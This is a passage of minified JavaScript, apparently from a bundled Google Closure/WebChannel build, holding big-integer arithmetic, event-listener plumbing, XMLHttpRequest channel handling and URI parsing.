E},n.toString=function(E){if(E=E||10,2>E||36<E)throw Error("radix out of range: "+E);if(D(this))return"0";if(b(this))return"-"+T(this).toString(E);for(var v=l(Math.pow(E,6)),w=this,I="";;){var C=G(w,v).g;w=F(w,C.j(v));var A=((0<w.g.length?w.g[0]:w.h)>>>0).toString(E);if(w=C,D(w))return A+I;for(;6>A.length;)A="0"+A;I=A+I}},n.i=function(E){return 0>E?0:E<this.g.length?this.g[E]:this.h};function D(E){if(E.h!=0)return!1;for(var v=0;v<E.g.length;v++)if(E.g[v]!=0)return!1;return!0}function b(E){return E.h==-1}n.l=function(E){return E=F(this,E),b(E)?-1:D(E)?0:1};function T(E){for(var v=E.g.length,w=[],I=0;I<v;I++)w[I]=~E.g[I];return new s(w,~E.h).add(m)}n.abs=function(){return b(this)?T(this):this},n.add=function(E){for(var v=Math.max(this.g.length,E.g.length),w=[],I=0,C=0;C<=v;C++){var A=I+(this.i(C)&65535)+(E.i(C)&65535),_=(A>>>16)+(this.i(C)>>>16)+(E.i(C)>>>16);I=_>>>16,A&=65535,_&=65535,w[C]=_<<16|A}return new s(w,w[w.length-1]&-2147483648?-1:0)};function F(E,v){return E.add(T(v))}n.j=function(E){if(D(this)||D(E))return p;if(b(this))return b(E)?T(this).j(T(E)):T(T(this).j(E));if(b(E))return T(this.j(T(E)));if(0>this.l(y)&&0>E.l(y))return l(this.m()*E.m());for(var v=this.g.length+E.g.length,w=[],I=0;I<2*v;I++)w[I]=0;for(I=0;I<this.g.length;I++)for(var C=0;C<E.g.length;C++){var A=this.i(I)>>>16,_=this.i(I)&65535,er=E.i(C)>>>16,Ta=E.i(C)&65535;w[2*I+2*C]+=_*Ta,$(w,2*I+2*C),w[2*I+2*C+1]+=A*Ta,$(w,2*I+2*C+1),w[2*I+2*C+1]+=_*er,$(w,2*I+2*C+1),w[2*I+2*C+2]+=A*er,$(w,2*I+2*C+2)}for(I=0;I<v;I++)w[I]=w[2*I+1]<<16|w[2*I];for(I=v;I<2*v;I++)w[I]=0;return new s(w,0)};function $(E,v){for(;(E[v]&65535)!=E[v];)E[v+1]+=E[v]>>>16,E[v]&=65535,v++}function P(E,v){this.g=E,this.h=v}function G(E,v){if(D(v))throw Error("division by zero");if(D(E))return new P(p,p);if(b(E))return v=G(T(E),v),new P(T(v.g),T(v.h));if(b(v))return v=G(E,T(v)),new P(T(v.g),v.h);if(30<E.g.length){if(b(E)||b(v))throw Error("slowDivide_ only works with positive integers.");for(var w=m,I=v;0>=I.l(E);)w=Z(w),I=Z(I);var C=K(w,1),A=K(I,1);for(I=K(I,2),w=K(w,2);!D(I);){var _=A.add(I);0>=_.l(E)&&(C=C.add(w),A=_),I=K(I,1),w=K(w,1)}return v=F(E,C.j(v)),new P(C,v)}for(C=p;0<=E.l(v);){for(w=Math.max(1,Math.floor(E.m()/v.m())),I=Math.ceil(Math.log(w)/Math.LN2),I=48>=I?1:Math.pow(2,I-48),A=l(w),_=A.j(v);b(_)||0<_.l(E);)w-=I,A=l(w),_=A.j(v);D(A)&&(A=m),C=C.add(A),E=F(E,_)}return new P(C,E)}n.A=function(E){return G(this,E).h},n.and=function(E){for(var v=Math.max(this.g.length,E.g.length),w=[],I=0;I<v;I++)w[I]=this.i(I)&E.i(I);return new s(w,this.h&E.h)},n.or=function(E){for(var v=Math.max(this.g.length,E.g.length),w=[],I=0;I<v;I++)w[I]=this.i(I)|E.i(I);return new s(w,this.h|E.h)},n.xor=function(E){for(var v=Math.max(this.g.length,E.g.length),w=[],I=0;I<v;I++)w[I]=this.i(I)^E.i(I);return new s(w,this.h^E.h)};function Z(E){for(var v=E.g.length+1,w=[],I=0;I<v;I++)w[I]=E.i(I)<<1|E.i(I-1)>>>31;return new s(w,E.h)}function K(E,v){var w=v>>5;v%=32;for(var I=E.g.length-w,C=[],A=0;A<I;A++)C[A]=0<v?E.i(A+w)>>>v|E.i(A+w+1)<<32-v:E.i(A+w);return new s(C,E.h)}r.prototype.digest=r.prototype.v,r.prototype.reset=r.prototype.s,r.prototype.update=r.prototype.u,Kv=wA.Md5=r,s.prototype.add=s.prototype.add,s.prototype.multiply=s.prototype.j,s.prototype.modulo=s.prototype.A,s.prototype.compare=s.prototype.l,s.prototype.toNumber=s.prototype.m,s.prototype.toString=s.prototype.toString,s.prototype.getBits=s.prototype.i,s.fromNumber=l,s.fromString=h,di=wA.Integer=s}).apply(typeof _A<"u"?_A:typeof self<"u"?self:typeof window<"u"?window:{});var sf=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},br={};var Qv,hB,Us,Yv,su,af,Zv,Jv,Xv;(function(){var n,e=typeof Object.defineProperties=="function"?Object.defineProperty:function(u,d,f){return u==Array.prototype||u==Object.prototype||(u[d]=f.value),u};function t(u){u=[typeof globalThis=="object"&&globalThis,u,typeof window=="object"&&window,typeof self=="object"&&self,typeof sf=="object"&&sf];for(var d=0;d<u.length;++d){var f=u[d];if(f&&f.Math==Math)return f}throw Error("Cannot find global object")}var r=t(this);function i(u,d){if(d)e:{var f=r;u=u.split(".");for(var g=0;g<u.length-1;g++){var S=u[g];if(!(S in f))break e;f=f[S]}u=u[u.length-1],g=f[u],d=d(g),d!=g&&d!=null&&e(f,u,{configurable:!0,writable:!0,value:d})}}function o(u,d){u instanceof String&&(u+="");var f=0,g=!1,S={next:function(){if(!g&&f<u.length){var x=f++;return{value:d(x,u[x]),done:!1}}return g=!0,{done:!0,value:void 0}}};return S[Symbol.iterator]=function(){return S},S}i("Array.prototype.values",function(u){return u||function(){return o(this,function(d,f){return f})}});var s=s||{},a=this||self;function c(u){var d=typeof u;return d=d!="object"?d:u?Array.isArray(u)?"array":d:"null",d=="array"||d=="object"&&typeof u.length=="number"}function l(u){var d=typeof u;return d=="object"&&u!=null||d=="function"}function h(u,d,f){return u.call.apply(u.bind,arguments)}function p(u,d,f){if(!u)throw Error();if(2<arguments.length){var g=Array.prototype.slice.call(arguments,2);return function(){var S=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(S,g),u.apply(d,S)}}return function(){return u.apply(d,arguments)}}function m(u,d,f){return m=Function.prototype.bind&&Function.prototype.bind.toString().indexOf("native code")!=-1?h:p,m.apply(null,arguments)}function y(u,d){var f=Array.prototype.slice.call(arguments,1);return function(){var g=f.slice();return g.push.apply(g,arguments),u.apply(this,g)}}function D(u,d){function f(){}f.prototype=d.prototype,u.aa=d.prototype,u.prototype=new f,u.prototype.constructor=u,u.Qb=function(g,S,x){for(var B=Array(arguments.length-2),Ae=2;Ae<arguments.length;Ae++)B[Ae-2]=arguments[Ae];return d.prototype[S].apply(g,B)}}function b(u){let d=u.length;if(0<d){let f=Array(d);for(let g=0;g<d;g++)f[g]=u[g];return f}return[]}function T(u,d){for(let f=1;f<arguments.length;f++){let g=arguments[f];if(c(g)){let S=u.length||0,x=g.length||0;u.length=S+x;for(let B=0;B<x;B++)u[S+B]=g[B]}else u.push(g)}}class F{constructor(d,f){this.i=d,this.j=f,this.h=0,this.g=null}get(){let d;return 0<this.h?(this.h--,d=this.g,this.g=d.next,d.next=null):d=this.i(),d}}function $(u){return/^[\s\xa0]*$/.test(u)}function P(){var u=a.navigator;return u&&(u=u.userAgent)?u:""}function G(u){return G[" "](u),u}G[" "]=function(){};var Z=P().indexOf("Gecko")!=-1&&!(P().toLowerCase().indexOf("webkit")!=-1&&P().indexOf("Edge")==-1)&&!(P().indexOf("Trident")!=-1||P().indexOf("MSIE")!=-1)&&P().indexOf("Edge")==-1;function K(u,d,f){for(let g in u)d.call(f,u[g],g,u)}function E(u,d){for(let f in u)d.call(void 0,u[f],f,u)}function v(u){let d={};for(let f in u)d[f]=u[f];return d}let w="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function I(u,d){let f,g;for(let S=1;S<arguments.length;S++){g=arguments[S];for(f in g)u[f]=g[f];for(let x=0;x<w.length;x++)f=w[x],Object.prototype.hasOwnProperty.call(g,f)&&(u[f]=g[f])}}function C(u){var d=1;u=u.split(":");let f=[];for(;0<d&&u.length;)f.push(u.shift()),d--;return u.length&&f.push(u.join(":")),f}function A(u){a.setTimeout(()=>{throw u},0)}function _(){var u=Rp;let d=null;return u.g&&(d=u.g,u.g=u.g.next,u.g||(u.h=null),d.next=null),d}class er{constructor(){this.h=this.g=null}add(d,f){let g=Ta.get();g.set(d,f),this.h?this.h.next=g:this.g=g,this.h=g}}var Ta=new F(()=>new tN,u=>u.reset());class tN{constructor(){this.next=this.g=this.h=null}set(d,f){this.h=d,this.g=f,this.next=null}reset(){this.next=this.g=this.h=null}}let Sa,Aa=!1,Rp=new er,tI=()=>{let u=a.Promise.resolve(void 0);Sa=()=>{u.then(nN)}};var nN=()=>{for(var u;u=_();){try{u.h.call(u.g)}catch(f){A(f)}var d=Ta;d.j(u),100>d.h&&(d.h++,u.next=d.g,d.g=u)}Aa=!1};function Or(){this.s=this.s,this.C=this.C}Or.prototype.s=!1,Or.prototype.ma=function(){this.s||(this.s=!0,this.N())},Or.prototype.N=function(){if(this.C)for(;this.C.length;)this.C.shift()()};function _t(u,d){this.type=u,this.g=this.target=d,this.defaultPrevented=!1}_t.prototype.h=function(){this.defaultPrevented=!0};var rN=function(){if(!a.addEventListener||!Object.defineProperty)return!1;var u=!1,d=Object.defineProperty({},"passive",{get:function(){u=!0}});try{let f=()=>{};a.addEventListener("test",f,d),a.removeEventListener("test",f,d)}catch{}return u}();function Ma(u,d){if(_t.call(this,u?u.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,u){var f=this.type=u.type,g=u.changedTouches&&u.changedTouches.length?u.changedTouches[0]:null;if(this.target=u.target||u.srcElement,this.g=d,d=u.relatedTarget){if(Z){e:{try{G(d.nodeName);var S=!0;break e}catch{}S=!1}S||(d=null)}}else f=="mouseover"?d=u.fromElement:f=="mouseout"&&(d=u.toElement);this.relatedTarget=d,g?(this.clientX=g.clientX!==void 0?g.clientX:g.pageX,this.clientY=g.clientY!==void 0?g.clientY:g.pageY,this.screenX=g.screenX||0,this.screenY=g.screenY||0):(this.clientX=u.clientX!==void 0?u.clientX:u.pageX,this.clientY=u.clientY!==void 0?u.clientY:u.pageY,this.screenX=u.screenX||0,this.screenY=u.screenY||0),this.button=u.button,this.key=u.key||"",this.ctrlKey=u.ctrlKey,this.altKey=u.altKey,this.shiftKey=u.shiftKey,this.metaKey=u.metaKey,this.pointerId=u.pointerId||0,this.pointerType=typeof u.pointerType=="string"?u.pointerType:iN[u.pointerType]||"",this.state=u.state,this.i=u,u.defaultPrevented&&Ma.aa.h.call(this)}}D(Ma,_t);var iN={2:"touch",3:"pen",4:"mouse"};Ma.prototype.h=function(){Ma.aa.h.call(this);var u=this.i;u.preventDefault?u.preventDefault():u.returnValue=!1};var xa="closure_listenable_"+(1e6*Math.random()|0),oN=0;function sN(u,d,f,g,S){this.listener=u,this.proxy=null,this.src=d,this.type=f,this.capture=!!g,this.ha=S,this.key=++oN,this.da=this.fa=!1}function Wu(u){u.da=!0,u.listener=null,u.proxy=null,u.src=null,u.ha=null}function Ku(u){this.src=u,this.g={},this.h=0}Ku.prototype.add=function(u,d,f,g,S){var x=u.toString();u=this.g[x],u||(u=this.g[x]=[],this.h++);var B=Pp(u,d,g,S);return-1<B?(d=u[B],f||(d.fa=!1)):(d=new sN(d,this.src,x,!!g,S),d.fa=f,u.push(d)),d};function Np(u,d){var f=d.type;if(f in u.g){var g=u.g[f],S=Array.prototype.indexOf.call(g,d,void 0),x;(x=0<=S)&&Array.prototype.splice.call(g,S,1),x&&(Wu(d),u.g[f].length==0&&(delete u.g[f],u.h--))}}function Pp(u,d,f,g){for(var S=0;S<u.length;++S){var x=u[S];if(!x.da&&x.listener==d&&x.capture==!!f&&x.ha==g)return S}return-1}var kp="closure_lm_"+(1e6*Math.random()|0),Op={};function nI(u,d,f,g,S){if(g&&g.once)return iI(u,d,f,g,S);if(Array.isArray(d)){for(var x=0;x<d.length;x++)nI(u,d[x],f,g,S);return null}return f=Up(f),u&&u[xa]?u.K(d,f,l(g)?!!g.capture:!!g,S):rI(u,d,f,!1,g,S)}function rI(u,d,f,g,S,x){if(!d)throw Error("Invalid event type");var B=l(S)?!!S.capture:!!S,Ae=Vp(u);if(Ae||(u[kp]=Ae=new Ku(u)),f=Ae.add(d,f,g,B,x),f.proxy)return f;if(g=aN(),f.proxy=g,g.src=u,g.listener=f,u.addEventListener)rN||(S=B),S===void 0&&(S=!1),u.addEventListener(d.toString(),g,S);else if(u.attachEvent)u.attachEvent(sI(d.toString()),g);else if(u.addListener&&u.removeListener)u.addListener(g);else throw Error("addEventListener and attachEvent are unavailable.");return f}function aN(){function u(f){return d.call(u.src,u.listener,f)}let d=cN;return u}function iI(u,d,f,g,S){if(Array.isArray(d)){for(var x=0;x<d.length;x++)iI(u,d[x],f,g,S);return null}return f=Up(f),u&&u[xa]?u.L(d,f,l(g)?!!g.capture:!!g,S):rI(u,d,f,!0,g,S)}function oI(u,d,f,g,S){if(Array.isArray(d))for(var x=0;x<d.length;x++)oI(u,d[x],f,g,S);else g=l(g)?!!g.capture:!!g,f=Up(f),u&&u[xa]?(u=u.i,d=String(d).toString(),d in u.g&&(x=u.g[d],f=Pp(x,f,g,S),-1<f&&(Wu(x[f]),Array.prototype.splice.call(x,f,1),x.length==0&&(delete u.g[d],u.h--)))):u&&(u=Vp(u))&&(d=u.g[d.toString()],u=-1,d&&(u=Pp(d,f,g,S)),(f=-1<u?d[u]:null)&&Fp(f))}function Fp(u){if(typeof u!="number"&&u&&!u.da){var d=u.src;if(d&&d[xa])Np(d.i,u);else{var f=u.type,g=u.proxy;d.removeEventListener?d.removeEventListener(f,g,u.capture):d.detachEvent?d.detachEvent(sI(f),g):d.addListener&&d.removeListener&&d.removeListener(g),(f=Vp(d))?(Np(f,u),f.h==0&&(f.src=null,d[kp]=null)):Wu(u)}}}function sI(u){return u in Op?Op[u]:Op[u]="on"+u}function cN(u,d){if(u.da)u=!0;else{d=new Ma(d,this);var f=u.listener,g=u.ha||u.src;u.fa&&Fp(u),u=f.call(g,d)}return u}function Vp(u){return u=u[kp],u instanceof Ku?u:null}var Lp="__closure_events_fn_"+(1e9*Math.random()>>>0);function Up(u){return typeof u=="function"?u:(u[Lp]||(u[Lp]=function(d){return u.handleEvent(d)}),u[Lp])}function wt(){Or.call(this),this.i=new Ku(this),this.M=this,this.F=null}D(wt,Or),wt.prototype[xa]=!0,wt.prototype.removeEventListener=function(u,d,f,g){oI(this,u,d,f,g)};function At(u,d){var f,g=u.F;if(g)for(f=[];g;g=g.F)f.push(g);if(u=u.M,g=d.type||d,typeof d=="string")d=new _t(d,u);else if(d instanceof _t)d.target=d.target||u;else{var S=d;d=new _t(g,u),I(d,S)}if(S=!0,f)for(var x=f.length-1;0<=x;x--){var B=d.g=f[x];S=Qu(B,g,!0,d)&&S}if(B=d.g=u,S=Qu(B,g,!0,d)&&S,S=Qu(B,g,!1,d)&&S,f)for(x=0;x<f.length;x++)B=d.g=f[x],S=Qu(B,g,!1,d)&&S}wt.prototype.N=function(){if(wt.aa.N.call(this),this.i){var u=this.i,d;for(d in u.g){for(var f=u.g[d],g=0;g<f.length;g++)Wu(f[g]);delete u.g[d],u.h--}}this.F=null},wt.prototype.K=function(u,d,f,g){return this.i.add(String(u),d,!1,f,g)},wt.prototype.L=function(u,d,f,g){return this.i.add(String(u),d,!0,f,g)};function Qu(u,d,f,g){if(d=u.i.g[String(d)],!d)return!0;d=d.concat();for(var S=!0,x=0;x<d.length;++x){var B=d[x];if(B&&!B.da&&B.capture==f){var Ae=B.listener,pt=B.ha||B.src;B.fa&&Np(u.i,B),S=Ae.call(pt,g)!==!1&&S}}return S&&!g.defaultPrevented}function aI(u,d,f){if(typeof u=="function")f&&(u=m(u,f));else if(u&&typeof u.handleEvent=="function")u=m(u.handleEvent,u);else throw Error("Invalid listener argument");return 2147483647<Number(d)?-1:a.setTimeout(u,d||0)}function cI(u){u.g=aI(()=>{u.g=null,u.i&&(u.i=!1,cI(u))},u.l);let d=u.h;u.h=null,u.m.apply(null,d)}class uN extends Or{constructor(d,f){super(),this.m=d,this.l=f,this.h=null,this.i=!1,this.g=null}j(d){this.h=arguments,this.g?this.i=!0:cI(this)}N(){super.N(),this.g&&(a.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function Ra(u){Or.call(this),this.h=u,this.g={}}D(Ra,Or);var uI=[];function lI(u){K(u.g,function(d,f){this.g.hasOwnProperty(f)&&Fp(d)},u),u.g={}}Ra.prototype.N=function(){Ra.aa.N.call(this),lI(this)},Ra.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")};var jp=a.JSON.stringify,lN=a.JSON.parse,dN=class{stringify(u){return a.JSON.stringify(u,void 0)}parse(u){return a.JSON.parse(u,void 0)}};function Bp(){}Bp.prototype.h=null;function dI(u){return u.h||(u.h=u.i())}function hI(){}var Na={OPEN:"a",kb:"b",Ja:"c",wb:"d"};function $p(){_t.call(this,"d")}D($p,_t);function Hp(){_t.call(this,"c")}D(Hp,_t);var Ri={},fI=null;function Yu(){return fI=fI||new wt}Ri.La="serverreachability";function pI(u){_t.call(this,Ri.La,u)}D(pI,_t);function Pa(u){let d=Yu();At(d,new pI(d))}Ri.STAT_EVENT="statevent";function gI(u,d){_t.call(this,Ri.STAT_EVENT,u),this.stat=d}D(gI,_t);function Mt(u){let d=Yu();At(d,new gI(d,u))}Ri.Ma="timingevent";function mI(u,d){_t.call(this,Ri.Ma,u),this.size=d}D(mI,_t);function ka(u,d){if(typeof u!="function")throw Error("Fn must not be null and must be a function");return a.setTimeout(function(){u()},d)}function Oa(){this.g=!0}Oa.prototype.xa=function(){this.g=!1};function hN(u,d,f,g,S,x){u.info(function(){if(u.g)if(x)for(var B="",Ae=x.split("&"),pt=0;pt<Ae.length;pt++){var Ee=Ae[pt].split("=");if(1<Ee.length){var Et=Ee[0];Ee=Ee[1];var It=Et.split("_");B=2<=It.length&&It[1]=="type"?B+(Et+"="+Ee+"&"):B+(Et+"=redacted&")}}else B=null;else B=x;return"XMLHTTP REQ ("+g+") [attempt "+S+"]: "+d+`
`+f+`
`+B})}function fN(u,d,f,g,S,x,B){u.info(function(){return"XMLHTTP RESP ("+g+") [ attempt "+S+"]: "+d+`
`+f+`
`+x+" "+B})}function No(u,d,f,g){u.info(function(){return"XMLHTTP TEXT ("+d+"): "+gN(u,f)+(g?" "+g:"")})}function pN(u,d){u.info(function(){return"TIMEOUT: "+d})}Oa.prototype.info=function(){};function gN(u,d){if(!u.g)return d;if(!d)return null;try{var f=JSON.parse(d);if(f){for(u=0;u<f.length;u++)if(Array.isArray(f[u])){var g=f[u];if(!(2>g.length)){var S=g[1];if(Array.isArray(S)&&!(1>S.length)){var x=S[0];if(x!="noop"&&x!="stop"&&x!="close")for(var B=1;B<S.length;B++)S[B]=""}}}}return jp(f)}catch{return d}}var Zu={NO_ERROR:0,gb:1,tb:2,sb:3,nb:4,rb:5,ub:6,Ia:7,TIMEOUT:8,xb:9},yI={lb:"complete",Hb:"success",Ja:"error",Ia:"abort",zb:"ready",Ab:"readystatechange",TIMEOUT:"timeout",vb:"incrementaldata",yb:"progress",ob:"downloadprogress",Pb:"uploadprogress"},qp;function Ju(){}D(Ju,Bp),Ju.prototype.g=function(){return new XMLHttpRequest},Ju.prototype.i=function(){return{}},qp=new Ju;function Fr(u,d,f,g){this.j=u,this.i=d,this.l=f,this.R=g||1,this.U=new Ra(this),this.I=45e3,this.H=null,this.o=!1,this.m=this.A=this.v=this.L=this.F=this.S=this.B=null,this.D=[],this.g=null,this.C=0,this.s=this.u=null,this.X=-1,this.J=!1,this.O=0,this.M=null,this.W=this.K=this.T=this.P=!1,this.h=new vI}function vI(){this.i=null,this.g="",this.h=!1}var _I={},zp={};function Gp(u,d,f){u.L=1,u.v=nl(tr(d)),u.m=f,u.P=!0,wI(u,null)}function wI(u,d){u.F=Date.now(),Xu(u),u.A=tr(u.v);var f=u.A,g=u.R;Array.isArray(g)||(g=[String(g)]),kI(f.i,"t",g),u.C=0,f=u.j.J,u.h=new vI,u.g=JI(u.j,f?d:null,!u.m),0<u.O&&(u.M=new uN(m(u.Y,u,u.g),u.O)),d=u.U,f=u.g,g=u.ca;var S="readystatechange";Array.isArray(S)||(S&&(uI[0]=S.toString()),S=uI);for(var x=0;x<S.length;x++){var B=nI(f,S[x],g||d.handleEvent,!1,d.h||d);if(!B)break;d.g[B.key]=B}d=u.H?v(u.H):{},u.m?(u.u||(u.u="POST"),d["Content-Type"]="application/x-www-form-urlencoded",u.g.ea(u.A,u.u,u.m,d)):(u.u="GET",u.g.ea(u.A,u.u,null,d)),Pa(),hN(u.i,u.u,u.A,u.l,u.R,u.m)}Fr.prototype.ca=function(u){u=u.target;let d=this.M;d&&nr(u)==3?d.j():this.Y(u)},Fr.prototype.Y=function(u){try{if(u==this.g)e:{let It=nr(this.g);var d=this.g.Ba();let Oo=this.g.Z();if(!(3>It)&&(It!=3||this.g&&(this.h.h||this.g.oa()||BI(this.g)))){this.J||It!=4||d==7||(d==8||0>=Oo?Pa(3):Pa(2)),Wp(this);var f=this.g.Z();this.X=f;t:if(EI(this)){var g=BI(this.g);u="";var S=g.length,x=nr(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){Ni(this),Fa(this);var B="";break t}this.h.i=new a.TextDecoder}for(d=0;d<S;d++)this.h.h=!0,u+=this.h.i.decode(g[d],{stream:!(x&&d==S-1)});g.length=0,this.h.g+=u,this.C=0,B=this.h.g}else B=this.g.oa();if(this.o=f==200,fN(this.i,this.u,this.A,this.l,this.R,It,f),this.o){if(this.T&&!this.K){t:{if(this.g){var Ae,pt=this.g;if((Ae=pt.g?pt.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!$(Ae)){var Ee=Ae;break t}}Ee=null}if(f=Ee)No(this.i,this.l,f,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,Kp(this,f);else{this.o=!1,this.s=3,Mt(12),Ni(this),Fa(this);break e}}if(this.P){f=!0;let vn;for(;!this.J&&this.C<B.length;)if(vn=mN(this,B),vn==zp){It==4&&(this.s=4,Mt(14),f=!1),No(this.i,this.l,null,"[Incomplete Response]");break}else if(vn==_I){this.s=4,Mt(15),No(this.i,this.l,B,"[Invalid Chunk]"),f=!1;break}else No(this.i,this.l,vn,null),Kp(this,vn);if(EI(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),It!=4||B.length!=0||this.h.h||(this.s=1,Mt(16),f=!1),this.o=this.o&&f,!f)No(this.i,this.l,B,"[Invalid Chunked Response]"),Ni(this),Fa(this);else if(0<B.length&&!this.W){this.W=!0;var Et=this.j;Et.g==this&&Et.ba&&!Et.M&&(Et.j.info("Great, no buffering proxy detected. Bytes received: "+B.length),eg(Et),Et.M=!0,Mt(11))}}else No(this.i,this.l,B,null),Kp(this,B);It==4&&Ni(this),this.o&&!this.J&&(It==4?KI(this.j,this):(this.o=!1,Xu(this)))}else PN(this.g),f==400&&0<B.indexOf("Unknown SID")?(this.s=3,Mt(12)):(this.s=0,Mt(13)),Ni(this),Fa(this)}}}catch{}finally{}};function EI(u){return u.g?u.u=="GET"&&u.L!=2&&u.j.Ca:!1}function mN(u,d){var f=u.C,g=d.indexOf(`
`,f);return g==-1?zp:(f=Number(d.substring(f,g)),isNaN(f)?_I:(g+=1,g+f>d.length?zp:(d=d.slice(g,g+f),u.C=g+f,d)))}Fr.prototype.cancel=function(){this.J=!0,Ni(this)};function Xu(u){u.S=Date.now()+u.I,II(u,u.I)}function II(u,d){if(u.B!=null)throw Error("WatchDog timer not null");u.B=ka(m(u.ba,u),d)}function Wp(u){u.B&&(a.clearTimeout(u.B),u.B=null)}Fr.prototype.ba=function(){this.B=null;let u=Date.now();0<=u-this.S?(pN(this.i,this.A),this.L!=2&&(Pa(),Mt(17)),Ni(this),this.s=2,Fa(this)):II(this,this.S-u)};function Fa(u){u.j.G==0||u.J||KI(u.j,u)}function Ni(u){Wp(u);var d=u.M;d&&typeof d.ma=="function"&&d.ma(),u.M=null,lI(u.U),u.g&&(d=u.g,u.g=null,d.abort(),d.ma())}function Kp(u,d){try{var f=u.j;if(f.G!=0&&(f.g==u||Qp(f.h,u))){if(!u.K&&Qp(f.h,u)&&f.G==3){try{var g=f.Da.g.parse(d)}catch{g=null}if(Array.isArray(g)&&g.length==3){var S=g;if(S[0]==0){e:if(!f.u){if(f.g)if(f.g.F+3e3<u.F)al(f),ol(f);else break e;Xp(f),Mt(18)}}else f.za=S[1],0<f.za-f.T&&37500>S[2]&&f.F&&f.v==0&&!f.C&&(f.C=ka(m(f.Za,f),6e3));if(1>=bI(f.h)&&f.ca){try{f.ca()}catch{}f.ca=void 0}}else ki(f,11)}else if((u.K||f.g==u)&&al(f),!$(d))for(S=f.Da.g.parse(d),d=0;d<S.length;d++){let Ee=S[d];if(f.T=Ee[0],Ee=Ee[1],f.G==2)if(Ee[0]=="c"){f.K=Ee[1],f.ia=Ee[2];let Et=Ee[3];Et!=null&&(f.la=Et,f.j.info("VER="+f.la));let It=Ee[4];It!=null&&(f.Aa=It,f.j.info("SVER="+f.Aa));let Oo=Ee[5];Oo!=null&&typeof Oo=="number"&&0<Oo&&(g=1.5*Oo,f.L=g,f.j.info("backChannelRequestTimeoutMs_="+g)),g=f;let vn=u.g;if(vn){let ul=vn.g?vn.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(ul){var x=g.h;x.g||ul.indexOf("spdy")==-1&&ul.indexOf("quic")==-1&&ul.indexOf("h2")==-1||(x.j=x.l,x.g=new Set,x.h&&(Yp(x,x.h),x.h=null))}if(g.D){let tg=vn.g?vn.g.getResponseHeader("X-HTTP-Session-Id"):null;tg&&(g.ya=tg,ke(g.I,g.D,tg))}}f.G=3,f.l&&f.l.ua(),f.ba&&(f.R=Date.now()-u.F,f.j.info("Handshake RTT: "+f.R+"ms")),g=f;var B=u;if(g.qa=ZI(g,g.J?g.ia:null,g.W),B.K){TI(g.h,B);var Ae=B,pt=g.L;pt&&(Ae.I=pt),Ae.B&&(Wp(Ae),Xu(Ae)),g.g=B}else GI(g);0<f.i.length&&sl(f)}else Ee[0]!="stop"&&Ee[0]!="close"||ki(f,7);else f.G==3&&(Ee[0]=="stop"||Ee[0]=="close"?Ee[0]=="stop"?ki(f,7):Jp(f):Ee[0]!="noop"&&f.l&&f.l.ta(Ee),f.v=0)}}Pa(4)}catch{}}var yN=class{constructor(u,d){this.g=u,this.map=d}};function DI(u){this.l=u||10,a.PerformanceNavigationTiming?(u=a.performance.getEntriesByType("navigation"),u=0<u.length&&(u[0].nextHopProtocol=="hq"||u[0].nextHopProtocol=="h2")):u=!!(a.chrome&&a.chrome.loadTimes&&a.chrome.loadTimes()&&a.chrome.loadTimes().wasFetchedViaSpdy),this.j=u?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function CI(u){return u.h?!0:u.g?u.g.size>=u.j:!1}function bI(u){return u.h?1:u.g?u.g.size:0}function Qp(u,d){return u.h?u.h==d:u.g?u.g.has(d):!1}function Yp(u,d){u.g?u.g.add(d):u.h=d}function TI(u,d){u.h&&u.h==d?u.h=null:u.g&&u.g.has(d)&&u.g.delete(d)}DI.prototype.cancel=function(){if(this.i=SI(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(let u of this.g.values())u.cancel();this.g.clear()}};function SI(u){if(u.h!=null)return u.i.concat(u.h.D);if(u.g!=null&&u.g.size!==0){let d=u.i;for(let f of u.g.values())d=d.concat(f.D);return d}return b(u.i)}function vN(u){if(u.V&&typeof u.V=="function")return u.V();if(typeof Map<"u"&&u instanceof Map||typeof Set<"u"&&u instanceof Set)return Array.from(u.values());if(typeof u=="string")return u.split("");if(c(u)){for(var d=[],f=u.length,g=0;g<f;g++)d.push(u[g]);return d}d=[],f=0;for(g in u)d[f++]=u[g];return d}function _N(u){if(u.na&&typeof u.na=="function")return u.na();if(!u.V||typeof u.V!="function"){if(typeof Map<"u"&&u instanceof Map)return Array.from(u.keys());if(!(typeof Set<"u"&&u instanceof Set)){if(c(u)||typeof u=="string"){var d=[];u=u.length;for(var f=0;f<u;f++)d.push(f);return d}d=[],f=0;for(let g in u)d[f++]=g;return d}}}function AI(u,d){if(u.forEach&&typeof u.forEach=="function")u.forEach(d,void 0);else if(c(u)||typeof u=="string")Array.prototype.forEach.call(u,d,void 0);else for(var f=_N(u),g=vN(u),S=g.length,x=0;x<S;x++)d.call(void 0,g[x],f&&f[x],u)}var MI=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function wN(u,d){if(u){u=u.split("&");for(var f=0;f<u.length;f++){var g=u[f].indexOf("="),S=null;if(0<=g){var x=u[f].substring(0,g);S=u[f].substring(g+1)}else x=u[f];d(x,S?decodeURIComponent(S.replace(/\+/g," ")):"")}}}function Pi(u){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,u instanceof Pi){this.h=u.h,el(this,u.j),this.o=u.o,this.g=u.g,tl(this,u.s),this.l=u.l;var d=u.i,f=new Ua;f.i=d.i,d.g&&(f.g=new Map(d.g),f.h=d.h),xI(this,f),this.m=u.m}else 